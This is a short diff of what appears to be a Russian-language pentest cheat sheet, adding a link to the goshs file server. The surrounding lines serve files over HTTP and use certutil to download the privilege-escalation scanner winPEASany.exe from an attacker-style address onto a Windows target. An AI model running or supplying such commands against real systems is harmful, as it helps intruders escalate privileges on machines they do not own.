@@ -75,7 +75,8 @@ mstsc /v:<адрес_компьютера>
 # Поднять HTTP сервер
 
 python3 -m http.server 8080
-
+	
+	https://github.com/goshs-labs/goshs
 	goshs -p 4243
 	certutil -urlcache -f http://10.10.16.32:4243/winPEASany.exe winPEASany.exe
 
